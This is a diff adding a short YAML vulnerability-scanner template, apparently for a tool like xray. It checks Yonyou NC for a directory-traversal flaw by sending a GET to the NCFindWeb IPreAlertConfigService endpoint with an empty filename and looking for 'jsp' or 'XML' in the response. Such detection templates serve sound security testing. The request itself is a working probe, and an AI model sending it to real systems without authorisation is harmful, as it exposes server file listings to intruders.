@@ -1,0 +1,13 @@
+name: poc-yaml-用友nc-Directory
+description: >-
+  目录遍历
+alwaysExecute: false
+matchCount: 1
+rules:
+  - method: GET
+    path: /NCFindWeb?service=IPreAlertConfigService&filename=
+    expression:
+      status: 200    
+      body_any:
+        - "jsp"
+        - "XML"
